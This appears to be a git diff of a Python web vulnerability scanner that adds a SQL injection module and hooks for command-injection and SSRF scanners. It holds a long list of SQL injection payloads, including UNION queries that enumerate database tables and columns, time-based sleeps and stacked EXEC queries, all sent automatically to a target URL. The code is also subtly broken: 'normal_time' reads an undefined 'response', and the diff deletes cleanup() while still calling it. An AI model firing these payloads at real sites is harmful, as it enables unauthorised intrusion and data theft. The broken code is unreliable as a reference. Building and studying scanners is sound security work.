@@ -19,27 +19,25 @@ from typing import Dict, List, Optional, Any, Tuple
 import aiohttp
 import asyncio
 import logging
+import traceback
+import aiohttp
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse
+import urllib.parse
+import re
+import time
+from datetime import datetime as dt
+from datetime import timezone
 from colorama import Fore, Style, init
 import sys
-import traceback
-import urllib.parse
-from bs4 import BeautifulSoup
-import uuid
-import time
-import os
 import psutil
 import threading
 import random
 import atexit
-import re
-from aiohttp import ClientSession, ClientError
-import ssl
-import socket
-from urllib.parse import urlparse
 import json
-from datetime import datetime as dt
-from datetime import timezone
 from models import db
+from modules.command_injection_scanner import CommandInjectionScanner
+from modules.ssrf_scanner import SSRFScanner
 
 # Initialize colorama for cross-platform color support
 init()
@@ -154,14 +152,21 @@ class BaseScanner:
                     raise
                 await asyncio.sleep(self.retry_delay * (attempt + 1))
                 
-    def add_vulnerability(self, vulnerability_type, description, severity="Medium", evidence=None):
+    def add_vulnerability(self, vulnerability_type, description, severity="Medium", evidence=None, reproduction_steps=None):
         """Add a vulnerability finding"""
         evidence_dict = evidence or {}
+        steps = reproduction_steps or []
+        
+        # Ensure reproduction steps is a list of strings
+        if isinstance(steps, str):
+            steps = [steps]
+            
         vuln = {
             'type': vulnerability_type,
             'description': description,
             'severity': severity,
             'evidence': json.dumps(evidence_dict),  # Serialize evidence to JSON
+            'reproduction_steps': json.dumps(steps),  # Serialize steps to JSON
             'timestamp': dt.now(timezone.utc).isoformat()
         }
         self.vulnerabilities.append(vuln)
@@ -274,8 +279,15 @@ class XSSScanner(BaseScanner):
     async def find_input_points(self, url):
         input_points = []
         try:
-            async with self.session.get(url, verify_ssl=False) as response:
+            self.logger.info(f"Fetching page content from {url}")
+            async with self.session.get(url, verify_ssl=False, timeout=self.timeout) as response:
+                if response.status != 200:
+                    self.logger.warning(f"Received non-200 status code: {response.status}")
+                    return input_points
+                
                 content = await response.text()
+                self.logger.info("Successfully retrieved page content")
+                
                 soup = BeautifulSoup(content, 'html.parser')
                 
                 # URL Parameters
@@ -283,10 +295,12 @@ class XSSScanner(BaseScanner):
                 if parsed_url.query:
                     params = urllib.parse.parse_qs(parsed_url.query)
                     for param in params:
+                        self.logger.debug(f"Found URL parameter: {param}")
                         input_points.append(('url_param', param))
                 
                 # Form Inputs
                 forms = soup.find_all('form')
+                self.logger.info(f"Found {len(forms)} forms")
                 for form in forms:
                     method = form.get('method', 'get').lower()
                     action = form.get('action', '')
@@ -296,11 +310,14 @@ class XSSScanner(BaseScanner):
                         base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                         action = urllib.parse.urljoin(base_url, action)
                     
+                    self.logger.debug(f"Processing form: method={method}, action={action}")
+                    
                     # Get all input elements
                     inputs = form.find_all(['input', 'textarea', 'select'])
                     for input_elem in inputs:
                         input_name = input_elem.get('name', '')
                         if input_name:
+                            self.logger.debug(f"Found form input: {input_name}")
                             input_points.append(('form', {
                                 'method': method,
                                 'action': action,
@@ -308,64 +325,21 @@ class XSSScanner(BaseScanner):
                                 'type': input_elem.get('type', 'text')
                             }))
                 
-                # Links with Parameters
-                links = soup.find_all('a', href=True)
-                for link in links:
-                    href = link['href']
-                    if not href.startswith(('http://', 'https://')):
-                        href = urllib.parse.urljoin(url, href)
-                    parsed_link = urlparse(href)
-                    if parsed_link.query:
-                        params = urllib.parse.parse_qs(parsed_link.query)
-                        for param in params:
-                            input_points.append(('link_param', {
-                                'url': href,
-                                'param': param
-                            }))
+                self.logger.info(f"Found {len(input_points)} input points")
+                return input_points
                 
-                # HTML Attributes
-                all_elements = soup.find_all()
-                for element in all_elements:
-                    for attr, value in element.attrs.items():
-                        if isinstance(value, str) and value.strip():
-                            input_points.append(('attribute', {
-                                'tag': element.name,
-                                'attribute': attr,
-                                'value': value
-                            }))
-                
-                # JavaScript Event Handlers
-                event_handlers = [
-                    'onclick', 'onmouseover', 'onmouseout', 'onload', 'onerror',
-                    'onsubmit', 'onchange', 'onfocus', 'onblur', 'onkeyup',
-                    'onkeydown', 'onkeypress'
-                ]
-                for element in all_elements:
-                    for handler in event_handlers:
-                        if element.has_attr(handler):
-                            input_points.append(('event_handler', {
-                                'tag': element.name,
-                                'handler': handler,
-                                'value': element[handler]
-                            }))
-                
-                # Custom Data Attributes
-                for element in all_elements:
-                    for attr in element.attrs:
-                        if attr.startswith('data-'):
-                            input_points.append(('data_attribute', {
-                                'tag': element.name,
-                                'attribute': attr,
-                                'value': element[attr]
-                            }))
-                
+        except aiohttp.ClientError as e:
+            self.logger.error(f"Network error while fetching {url}: {str(e)}")
         except Exception as e:
             self.logger.error(f"Error finding input points: {str(e)}")
+            self.logger.debug(traceback.format_exc())
         
         return input_points
 
     async def test_input_point(self, input_type, input_point, payload):
         try:
+            self.logger.debug(f"Testing {input_type} with payload: {payload}")
+            
             if input_type == 'url_param':
                 # Test URL parameters
                 parsed_url = urlparse(self.url)
@@ -374,14 +348,26 @@ class XSSScanner(BaseScanner):
                 query = urllib.parse.urlencode(params)
                 test_url = parsed_url._replace(query=query).geturl()
                 
-                async with self.session.get(test_url, verify_ssl=False) as response:
+                self.logger.debug(f"Testing URL parameter at: {test_url}")
+                async with self.session.get(test_url, verify_ssl=False, timeout=self.timeout) as response:
+                    if response.status != 200:
+                        self.logger.warning(f"Received non-200 status code: {response.status}")
+                        return
+                        
                     content = await response.text()
                     if await self.check_payload_reflection(content, payload):
+                        self.logger.info(f"Found XSS vulnerability in URL parameter: {input_point}")
+                        steps = [
+                            f"1. Navigate to {self.url}",
+                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
+                            "3. Observe that the payload is executed in the response"
+                        ]
                         self.add_vulnerability(
                             "XSS",
                             f"XSS vulnerability found in URL parameter '{input_point}'",
                             "High",
-                            {"url": test_url, "payload": payload}
+                            {"url": test_url, "payload": payload},
+                            reproduction_steps=steps
                         )
             
             elif input_type == 'form':
@@ -390,55 +376,57 @@ class XSSScanner(BaseScanner):
                 action = input_point['action']
                 data = {input_point['name']: payload}
                 
+                self.logger.debug(f"Testing form submission: method={method}, action={action}, data={data}")
+                
                 if method == 'get':
                     params = urllib.parse.urlencode(data)
                     test_url = f"{action}?{params}"
-                    async with self.session.get(test_url, verify_ssl=False) as response:
+                    async with self.session.get(test_url, verify_ssl=False, timeout=self.timeout) as response:
+                        if response.status != 200:
+                            self.logger.warning(f"Received non-200 status code: {response.status}")
+                            return
                         content = await response.text()
                 else:  # POST
-                    async with self.session.post(action, data=data, verify_ssl=False) as response:
+                    async with self.session.post(action, data=data, verify_ssl=False, timeout=self.timeout) as response:
+                        if response.status != 200:
+                            self.logger.warning(f"Received non-200 status code: {response.status}")
+                            return
                         content = await response.text()
                 
                 if await self.check_payload_reflection(content, payload):
+                    self.logger.info(f"Found XSS vulnerability in form input: {input_point['name']}")
+                    form_action = input_point.get('action', '')
+                    method = input_point.get('method', 'get').lower()
+                    input_name = input_point.get('name', '')
+                    
+                    steps = [
+                        f"1. Navigate to {self.url}",
+                        f"2. Locate the form with action '{form_action}'",
+                        f"3. Enter the following payload in the '{input_name}' field: {payload}",
+                        f"4. Submit the form using {method.upper()} method",
+                        "5. Observe that the payload is executed in the response"
+                    ]
+                    
                     self.add_vulnerability(
-                        "XSS",
-                        f"XSS vulnerability found in form input '{input_point['name']}'",
-                        "High",
-                        {"form_action": action, "method": method, "payload": payload}
+                        'XSS',
+                        f"XSS vulnerability found in form input '{input_name}'",
+                        'High',
+                        evidence={
+                            'form_action': form_action,
+                            'method': method,
+                            'payload': payload,
+                            'input_name': input_name
+                        },
+                        reproduction_steps=steps
                     )
-            
-            elif input_type == 'link_param':
-                # Test link parameters
-                parsed_url = urlparse(input_point['url'])
-                params = dict(urllib.parse.parse_qsl(parsed_url.query))
-                params[input_point['param']] = payload
-                query = urllib.parse.urlencode(params)
-                test_url = parsed_url._replace(query=query).geturl()
-                
-                async with self.session.get(test_url, verify_ssl=False) as response:
-                    content = await response.text()
-                    if await self.check_payload_reflection(content, payload):
-                        self.add_vulnerability(
-                            "XSS",
-                            f"XSS vulnerability found in link parameter '{input_point['param']}'",
-                            "High",
-                            {"url": test_url, "payload": payload}
-                        )
-            
-            elif input_type in ['attribute', 'event_handler', 'data_attribute']:
-                # For these types, we need to check if the payload appears in the context where it could be executed
-                async with self.session.get(self.url, verify_ssl=False) as response:
-                    content = await response.text()
-                    if await self.check_payload_reflection(content, payload):
-                        self.add_vulnerability(
-                            "XSS",
-                            f"Potential XSS vulnerability found in {input_type}",
-                            "Medium",
-                            {"element": input_point['tag'], "attribute": input_point.get('attribute', input_point.get('handler')), "payload": payload}
-                        )
-                        
+                    
+        except aiohttp.ClientError as e:
+            self.logger.error(f"Network error while testing input point: {str(e)}")
         except Exception as e:
             self.logger.error(f"Error testing input point: {str(e)}")
+            self.logger.debug(traceback.format_exc())
+        
+        return
 
     async def check_payload_reflection(self, content, payload):
         # Check for exact payload match
@@ -490,13 +478,398 @@ class XSSScanner(BaseScanner):
                 
         self.logger.info("XSS scan completed")
 
+class SQLInjectionScanner(BaseScanner):
+    def __init__(self, url, session=None):
+        super().__init__(url, session)
+        self.sql_payloads = [
+            # Boolean-based payloads
+            "' OR '1'='1",
+            '" OR "1"="1',
+            "' OR 1=1 -- ",
+            "' OR 1=1 #",
+            "' OR 'x'='x",
+            "admin' --",
+            "admin' #",
+            "' OR 'x'='x';--",
+            
+            # Error-based payloads
+            "'",
+            '"',
+            "')",
+            "'))",
+            "'))",
+            "'--",
+            '";--',
+            '""',
+            "''",
+            "`",
+            "´",
+            "¨",
+            "',",
+            '",',
+            
+            # UNION-based payloads
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--",
+            "' UNION SELECT NULL,NULL,NULL--",
+            "' UNION ALL SELECT NULL--",
+            "' UNION ALL SELECT NULL,NULL--",
+            "' UNION ALL SELECT NULL,NULL,NULL--",
+            
+            # Time-based payloads
+            "' OR SLEEP(5)--",
+            "' OR SLEEP(5)='",
+            "1' OR SLEEP(5)#",
+            "' OR pg_sleep(5)--",
+            "' OR WAITFOR DELAY '0:0:5'--",
+            
+            # Stacked queries
+            "'; SELECT SLEEP(5)--",
+            "'; WAITFOR DELAY '0:0:5'--",
+            
+            # Database specific payloads
+            # MySQL
+            "' OR IF(1=1, SLEEP(5), 0)--",
+            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            
+            # PostgreSQL
+            "' OR (SELECT pg_sleep(5))--",
+            "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+            
+            # MSSQL
+            "' OR WAITFOR DELAY '0:0:5'--",
+            "' OR IF EXISTS(SELECT * FROM users) WAITFOR DELAY '0:0:5'--",
+            
+            # Oracle
+            "' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",
+            
+            # Advanced payloads
+            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            "'+BENCHMARK(10000000,MD5(1))+'",
+            
+            # Blind SQL injection
+            "' OR 1=1 AND SLEEP(5)--",
+            "' OR 1=2 AND SLEEP(5)--",
+            "' OR SUBSTR(@@version,1,1)='5' AND SLEEP(5)--",
+            
+            # Out-of-band payloads
+            "'; DECLARE @q VARCHAR(8000);SELECT @q=0x73656C65637420404076657273696F6E;EXEC(@q)--",
+            "'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version;--",
+            
+            # Common table names
+            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+            "' UNION SELECT NULL,table_name FROM information_schema.tables--",
+            
+            # Column enumeration
+            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
+            "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--"
+        ]
+        
+        # Error patterns that might indicate SQL injection vulnerability
+        self.error_patterns = [
+            "SQL syntax.*MySQL",
+            "Warning.*mysql_.*",
+            "MySqlClient\.",
+            "PostgreSQL.*ERROR",
+            "Warning.*pg_.*",
+            "valid PostgreSQL result",
+            "Npgsql\.",
+            "Driver.* SQL[-_ ]*Server",
+            "OLE DB.* SQL Server",
+            "SQLServer JDBC Driver",
+            "Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
+            "ODBC SQL Server Driver",
+            "SQLServer JDBC Driver",
+            "Oracle error",
+            "Oracle.*Driver",
+            "Warning.*oci_.*",
+            "Warning.*ora_.*",
+            "CLI Driver.*DB2",
+            "DB2 SQL error",
+            "SQLite/JDBCDriver",
+            "SQLite.Exception",
+            "System.Data.SQLite.SQLiteException",
+            "Warning.*sqlite_.*",
+            "Warning.*SQLite3::",
+            "SQLITE_ERROR",
+            "SQL syntax.*POS([0-9]+)",
+            "MariaDB server version for the right syntax"
+        ]
+
+    async def find_input_points(self, url):
+        """Find potential SQL injection points in the application"""
+        input_points = []
+        try:
+            self.logger.info(f"Finding SQL injection points for {url}")
+            async with self.session.get(url, verify_ssl=False, timeout=self.timeout) as response:
+                if response.status != 200:
+                    self.logger.warning(f"Received non-200 status code: {response.status}")
+                    return input_points
+                
+                content = await response.text()
+                soup = BeautifulSoup(content, 'html.parser')
+                
+                # Find forms that might interact with database
+                forms = soup.find_all('form')
+                self.logger.info(f"Found {len(forms)} forms to test")
+                
+                for form in forms:
+                    method = form.get('method', 'get').lower()
+                    action = form.get('action', '')
+                    if not action:
+                        action = url
+                    elif not action.startswith(('http://', 'https://')):
+                        base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
+                        action = urllib.parse.urljoin(base_url, action)
+                    
+                    # Look for input fields that might be used in SQL queries
+                    inputs = form.find_all(['input', 'textarea'])
+                    for input_elem in inputs:
+                        input_type = input_elem.get('type', 'text')
+                        input_name = input_elem.get('name', '')
+                        if input_name and input_type in ['text', 'password', 'search', 'number', 'hidden']:
+                            self.logger.debug(f"Found potential SQL injection point in form: {input_name}")
+                            input_points.append(('form', {
+                                'method': method,
+                                'action': action,
+                                'name': input_name,
+                                'type': input_type
+                            }))
+                
+                # Find URL parameters
+                parsed_url = urlparse(url)
+                if parsed_url.query:
+                    params = urllib.parse.parse_qs(parsed_url.query)
+                    for param in params:
+                        self.logger.debug(f"Found URL parameter: {param}")
+                        input_points.append(('url_param', param))
+                
+                self.logger.info(f"Found total {len(input_points)} potential SQL injection points")
+                return input_points
+                
+        except Exception as e:
+            self.logger.error(f"Error finding SQL injection points: {str(e)}")
+            self.logger.debug(traceback.format_exc())
+        
+        return input_points
+
+    async def test_input_point(self, input_type, input_point, payload):
+        """Test an input point for SQL injection vulnerabilities"""
+        try:
+            self.logger.debug(f"Testing {input_type} with SQL payload: {payload}")
+            
+            if input_type == 'url_param':
+                # Test URL parameters
+                parsed_url = urlparse(self.url)
+                params = dict(urllib.parse.parse_qsl(parsed_url.query))
+                params[input_point] = payload
+                query = urllib.parse.urlencode(params)
+                test_url = parsed_url._replace(query=query).geturl()
+                
+                self.logger.debug(f"Testing URL parameter at: {test_url}")
+                
+                # First request with normal value
+                async with self.session.get(test_url.replace(payload, "normal_value"), verify_ssl=False, timeout=self.timeout) as normal_response:
+                    normal_content = await normal_response.text()
+                    normal_time = response.elapsed.total_seconds()
+                
+                # Second request with SQL injection payload
+                start_time = time.time()
+                async with self.session.get(test_url, verify_ssl=False, timeout=self.timeout) as response:
+                    content = await response.text()
+                    response_time = time.time() - start_time
+                    
+                    # Check for SQL errors
+                    if any(re.search(pattern, content, re.IGNORECASE) for pattern in self.error_patterns):
+                        self.logger.info(f"Found SQL injection vulnerability (error-based) in URL parameter: {input_point}")
+                        steps = [
+                            f"1. Navigate to {self.url}",
+                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
+                            "3. Observe the SQL error in the response"
+                        ]
+                        self.add_vulnerability(
+                            "SQL Injection",
+                            f"Error-based SQL injection vulnerability found in URL parameter '{input_point}'",
+                            "High",
+                            {"url": test_url, "payload": payload, "error_type": "Error-based"},
+                            reproduction_steps=steps
+                        )
+                    
+                    # Check for time-based injection
+                    elif response_time > normal_time + 4:  # Assuming 5-second sleep payloads
+                        self.logger.info(f"Found SQL injection vulnerability (time-based) in URL parameter: {input_point}")
+                        steps = [
+                            f"1. Navigate to {self.url}",
+                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
+                            f"3. Observe that the response takes more than {int(response_time)} seconds"
+                        ]
+                        self.add_vulnerability(
+                            "SQL Injection",
+                            f"Time-based SQL injection vulnerability found in URL parameter '{input_point}'",
+                            "High",
+                            {"url": test_url, "payload": payload, "response_time": response_time, "error_type": "Time-based"},
+                            reproduction_steps=steps
+                        )
+                    
+                    # Check for boolean-based injection
+                    elif len(content) != len(normal_content):
+                        self.logger.info(f"Potential SQL injection vulnerability (boolean-based) in URL parameter: {input_point}")
+                        steps = [
+                            f"1. Navigate to {self.url}",
+                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
+                            "3. Compare the response with a normal request",
+                            "4. Observe the difference in response content"
+                        ]
+                        self.add_vulnerability(
+                            "SQL Injection",
+                            f"Boolean-based SQL injection vulnerability found in URL parameter '{input_point}'",
+                            "High",
+                            {"url": test_url, "payload": payload, "error_type": "Boolean-based"},
+                            reproduction_steps=steps
+                        )
+            
+            elif input_type == 'form':
+                # Test form inputs
+                method = input_point['method']
+                action = input_point['action']
+                data = {input_point['name']: payload}
+                
+                self.logger.debug(f"Testing form submission: method={method}, action={action}, data={data}")
+                
+                # First request with normal value
+                normal_data = {input_point['name']: "normal_value"}
+                if method == 'get':
+                    params = urllib.parse.urlencode(normal_data)
+                    test_url = f"{action}?{params}"
+                    async with self.session.get(test_url, verify_ssl=False, timeout=self.timeout) as normal_response:
+                        normal_content = await normal_response.text()
+                        normal_time = response.elapsed.total_seconds()
+                else:
+                    async with self.session.post(action, data=normal_data, verify_ssl=False, timeout=self.timeout) as normal_response:
+                        normal_content = await normal_response.text()
+                        normal_time = response.elapsed.total_seconds()
+                
+                # Second request with SQL injection payload
+                start_time = time.time()
+                if method == 'get':
+                    params = urllib.parse.urlencode(data)
+                    test_url = f"{action}?{params}"
+                    async with self.session.get(test_url, verify_ssl=False, timeout=self.timeout) as response:
+                        content = await response.text()
+                        response_time = time.time() - start_time
+                else:
+                    async with self.session.post(action, data=data, verify_ssl=False, timeout=self.timeout) as response:
+                        content = await response.text()
+                        response_time = time.time() - start_time
+                
+                # Check for SQL errors
+                if any(re.search(pattern, content, re.IGNORECASE) for pattern in self.error_patterns):
+                    self.logger.info(f"Found SQL injection vulnerability (error-based) in form input: {input_point['name']}")
+                    steps = [
+                        f"1. Navigate to {self.url}",
+                        f"2. Locate the form with action '{action}'",
+                        f"3. Enter the following payload in the '{input_point['name']}' field: {payload}",
+                        f"4. Submit the form using {method.upper()} method",
+                        "5. Observe the SQL error in the response"
+                    ]
+                    self.add_vulnerability(
+                        "SQL Injection",
+                        f"Error-based SQL injection vulnerability found in form input '{input_point['name']}'",
+                        "High",
+                        {
+                            'form_action': action,
+                            'method': method,
+                            'input_name': input_point['name'],
+                            'payload': payload,
+                            'error_type': "Error-based"
+                        },
+                        reproduction_steps=steps
+                    )
+                
+                # Check for time-based injection
+                elif response_time > normal_time + 4:  # Assuming 5-second sleep payloads
+                    self.logger.info(f"Found SQL injection vulnerability (time-based) in form input: {input_point['name']}")
+                    steps = [
+                        f"1. Navigate to {self.url}",
+                        f"2. Locate the form with action '{action}'",
+                        f"3. Enter the following payload in the '{input_point['name']}' field: {payload}",
+                        f"4. Submit the form using {method.upper()} method",
+                        f"5. Observe that the response takes more than {int(response_time)} seconds"
+                    ]
+                    self.add_vulnerability(
+                        "SQL Injection",
+                        f"Time-based SQL injection vulnerability found in form input '{input_point['name']}'",
+                        "High",
+                        {
+                            'form_action': action,
+                            'method': method,
+                            'input_name': input_point['name'],
+                            'payload': payload,
+                            'response_time': response_time,
+                            'error_type': "Time-based"
+                        },
+                        reproduction_steps=steps
+                    )
+                
+                # Check for boolean-based injection
+                elif len(content) != len(normal_content):
+                    self.logger.info(f"Potential SQL injection vulnerability (boolean-based) in form input: {input_point['name']}")
+                    steps = [
+                        f"1. Navigate to {self.url}",
+                        f"2. Locate the form with action '{action}'",
+                        f"3. Enter the following payload in the '{input_point['name']}' field: {payload}",
+                        f"4. Submit the form using {method.upper()} method",
+                        "5. Compare the response with a normal request",
+                        "6. Observe the difference in response content"
+                    ]
+                    self.add_vulnerability(
+                        "SQL Injection",
+                        f"Boolean-based SQL injection vulnerability found in form input '{input_point['name']}'",
+                        "High",
+                        {
+                            'form_action': action,
+                            'method': method,
+                            'input_name': input_point['name'],
+                            'payload': payload,
+                            'error_type': "Boolean-based"
+                        },
+                        reproduction_steps=steps
+                    )
+                    
+        except aiohttp.ClientError as e:
+            self.logger.error(f"Network error while testing SQL injection point: {str(e)}")
+        except Exception as e:
+            self.logger.error(f"Error testing SQL injection point: {str(e)}")
+            self.logger.debug(traceback.format_exc())
+
+    async def _scan(self):
+        self.logger.info(f"Starting SQL injection scan for {self.url}")
+        
+        # Find all input points
+        input_points = await self.find_input_points(self.url)
+        self.logger.info(f"Found {len(input_points)} potential SQL injection points")
+        
+        # Test each input point with each payload
+        for input_type, input_point in input_points:
+            self.logger.info(f"Testing input point: {input_type} - {input_point}")
+            for payload in self.sql_payloads:
+                self.logger.debug(f"Testing SQL payload: {payload}")
+                await self.test_input_point(input_type, input_point, payload)
+                
+        self.logger.info("SQL injection scan completed")
+
 class VulnerabilityScanner:
     def __init__(self, url):
         self.url = url
         self.session = None
         self.xss_scanner = None
+        self.sql_scanner = None
+        self.cmd_scanner = None
+        self.ssrf_scanner = None
         self.logger = logging.getLogger(self.__class__.__name__)
         self.vulnerabilities = []
+        self.scan_status = {}
         
     async def __aenter__(self):
         await self.initialize()
@@ -507,74 +880,111 @@ class VulnerabilityScanner:
         
     async def initialize(self):
         """Initialize the scanner and its components"""
-        if not self.session:
-            self.session = aiohttp.ClientSession()
-        if not self.xss_scanner:
-            self.xss_scanner = XSSScanner(self.url, self.session)
-        
-    async def cleanup(self):
-        """Cleanup resources"""
-        if self.session:
-            await self.session.close()
-            self.session = None
+        try:
+            if not self.session:
+                timeout = aiohttp.ClientTimeout(total=30)
+                self.session = aiohttp.ClientSession(timeout=timeout)
+                
+            config = {
+                'timeout': 30,
+                'max_retries': 3,
+                'retry_delay': 1,
+                'headers': {
+                    'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
+                    'Accept': '*/*'
+                }
+            }
+            
+            if not self.xss_scanner:
+                self.xss_scanner = XSSScanner(self.url, self.session)
+            if not self.sql_scanner:
+                self.sql_scanner = SQLInjectionScanner(self.url, self.session)
+            if not self.cmd_scanner:
+                self.cmd_scanner = CommandInjectionScanner(self.url, self.session)
+            if not self.ssrf_scanner:
+                self.ssrf_scanner = SSRFScanner(self.url, self.session)
+                
+            self.logger.info("All scanners initialized successfully")
+            
+        except Exception as e:
+            self.logger.error(f"Error initializing scanners: {str(e)}")
+            await self.cleanup()
+            raise
             
     async def scan(self, checks=None):
-        """
-        Run security scans based on specified checks
-        
-        Args:
-            checks (list): List of security checks to run. If None, runs all checks.
-        """
+        """Perform vulnerability scan with enhanced error handling and progress tracking"""
         try:
-            self.logger.info(f"Starting security scan for {self.url}")
-            
-            # Initialize scanner components
             await self.initialize()
             
             if not checks:
-                checks = ['xss']  # Default to XSS scan if no checks specified
+                checks = ['xss', 'sql', 'cmd', 'ssrf']
                 
-            # Run XSS scan if specified
-            if 'xss' in checks:
-                self.logger.info("Starting XSS scan")
-                await self.xss_scanner._scan()
-                self.vulnerabilities.extend(self.xss_scanner.vulnerabilities)
+            # Initialize scan status
+            self.scan_status = {check: 'pending' for check in checks}
             
-            # Log results
-            if self.vulnerabilities:
-                self.logger.info(f"Found {len(self.vulnerabilities)} vulnerabilities")
-                for vuln in self.vulnerabilities:
-                    self.logger.info(f"- {vuln['type']}: {vuln['description']} (Severity: {vuln['severity']})")
-            else:
-                self.logger.info("No vulnerabilities found")
-                
+            # Run scans concurrently
+            tasks = []
+            if 'xss' in checks:
+                self.scan_status['xss'] = 'running'
+                tasks.append(self._run_scanner('xss', self.xss_scanner.scan()))
+            if 'sql' in checks:
+                self.scan_status['sql'] = 'running'
+                tasks.append(self._run_scanner('sql', self.sql_scanner.scan()))
+            if 'cmd' in checks:
+                self.scan_status['cmd'] = 'running'
+                tasks.append(self._run_scanner('cmd', self.cmd_scanner.scan()))
+            if 'ssrf' in checks:
+                self.scan_status['ssrf'] = 'running'
+                tasks.append(self._run_scanner('ssrf', self.ssrf_scanner.scan()))
+            
+            # Wait for all scans to complete
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # Process results
+            for scanner_type, result in zip(checks, results):
+                if isinstance(result, Exception):
+                    self.logger.error(f"{scanner_type.upper()} scan error: {str(result)}")
+                    self.scan_status[scanner_type] = 'error'
+                else:
+                    self.scan_status[scanner_type] = 'completed'
+                    if result:
+                        self.vulnerabilities.extend(result)
+            
             return {
-                'url': self.url,
                 'vulnerabilities': self.vulnerabilities,
-                'scan_time': dt.now(timezone.utc).isoformat(),
                 'total_vulnerabilities': len(self.vulnerabilities),
                 'status': 'completed',
+                'scan_status': self.scan_status,
                 'metrics': {
-                    'total_requests': self.xss_scanner.requests_made if self.xss_scanner else 0,
+                    'total_requests': sum(
+                        getattr(scanner, 'requests_made', 0)
+                        for scanner in [self.xss_scanner, self.sql_scanner, self.cmd_scanner, self.ssrf_scanner]
+                        if scanner
+                    ),
                     'checks_performed': checks
                 }
             }
             
         except Exception as e:
-            self.logger.error(f"Error during security scan: {str(e)}")
-            traceback.print_exc()
+            self.logger.error(f"Error during vulnerability scan: {str(e)}")
             return {
-                'url': self.url,
                 'vulnerabilities': [],
-                'scan_time': dt.now(timezone.utc).isoformat(),
                 'total_vulnerabilities': 0,
                 'status': 'error',
                 'error': str(e),
-                'metrics': {
-                    'total_requests': self.xss_scanner.requests_made if self.xss_scanner else 0,
-                    'checks_performed': checks
-                }
+                'scan_status': self.scan_status
             }
+            
         finally:
-            # Cleanup resources
             await self.cleanup()
+            
+    async def _run_scanner(self, scanner_type, scan_coroutine):
+        """Run individual scanner with error handling"""
+        try:
+            self.logger.info(f"Starting {scanner_type.upper()} scan")
+            result = await scan_coroutine
+            self.logger.info(f"Completed {scanner_type.upper()} scan")
+            return result
+        except Exception as e:
+            self.logger.error(f"Error in {scanner_type.upper()} scan: {str(e)}")
+            raise
